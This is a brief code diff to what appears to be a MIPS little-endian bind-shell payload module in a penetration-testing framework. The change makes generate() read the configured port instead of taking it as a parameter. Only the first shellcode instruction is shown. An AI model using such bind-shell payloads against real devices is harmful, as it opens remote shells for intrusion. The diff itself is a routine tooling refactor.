@@ -19,8 +19,8 @@ class Exploit(payloads.Payload):
     architecture = "mipsle"
     port = exploits.Option(5555, 'Bind Port', validators=validators.integer)
 
-    def generate(self, port):
-        bind_port = self.convert_port(port)
+    def generate(self):
+        bind_port = self.convert_port(self.port)
 
         self.payload = (
             "\xe0\xff\xbd\x27" +        # addiu   sp,sp,-32
